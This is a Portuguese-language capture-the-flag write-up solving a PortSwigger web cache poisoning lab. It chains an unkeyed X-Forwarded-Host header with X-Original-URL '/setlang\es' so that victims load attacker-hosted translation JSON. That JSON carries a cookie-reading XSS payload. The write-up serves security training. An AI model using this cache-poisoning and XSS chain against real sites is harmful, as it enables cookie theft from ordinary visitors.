#ctf 

https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities

**Param miner:**
- `X-forwarded-host`
- `x-original-url`

Existe um json na página onde o valor do `host` vem do header `X-forwarded-host`. 

```html
<script>
data = {"host":"0a9c007f04e93301809021f3009c0052.web-security-academy.net","path":"/"}
</script>
```

Essa url é usada para buscar pela lista de traduções nesta função.

```javascript
function initTranslations(jsonUrl)
{
    const lang = document.cookie.split(';')
        .map(c => c.trim().split('='))
        .filter(p => p[0] === 'lang')
        .map(p => p[1])
        .find(() => true);

    const translate = (dict, el) => {
        for (const k in dict) {
            if (el.innerHTML === k) {
                el.innerHTML = dict[k];
            } else {
                el.childNodes.forEach(el_ => translate(dict, el_));
            }
        }
    }

    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            const select = document.getElementById('lang-select');
            if (select) {
                for (const code in j) {
                    const name = j[code].name;
                    const el = document.createElement("option");
                    el.setAttribute("value", code);
                    el.innerText = name;
                    select.appendChild(el);
                    if (code === lang) {
                        select.selectedIndex = select.childElementCount - 1;
                    }
                }
            }

            lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
        });
}
```

Ao criar nossa própria lista de traduções podemos usar o `X-forwared-host` para buscar ela.

```
/resources/json/translations.json

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *

{
    "es": {
        "name":"Espanhol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "<img src=1 onerror=alert(document.cookie)>",
            "Description:": "Desc:"
         }
    },
    "en":{
        "name":"English"
     }
}
```

Até aqui temos a vulnerabilidade explorada, porém para finalizar o lab precisamos fazer o usuário (que só usa a tradução inglês) rodar isso.

Existe uma rota `/setlang/{tradução}` que é acionada quando o usuário escolhe a tradução desejada e ela seta o cookie `lang={tradução}`. Porém como o cookie é setado, a resposta não vai para o cache.

O outro header que o **ParamMiner** encontrou `X-original-url`, pode ser usado para alterar a rota `X-original-url: /setlang/es`. Passando esse valor para o header, a resposta também não vai para o cache, mas se usar `\` ela é armazenada: `X-original-url: /setlang\es`.

Combinando os dois exploits:
1.  `GET /?localized=1` com `X-Forwarded-Host: exploit-0a4600c703293ab382090f5d01b900e1.exploit-server.net`
2. Segundo o `GET /` com `X-original-url: /setlang\es`

GG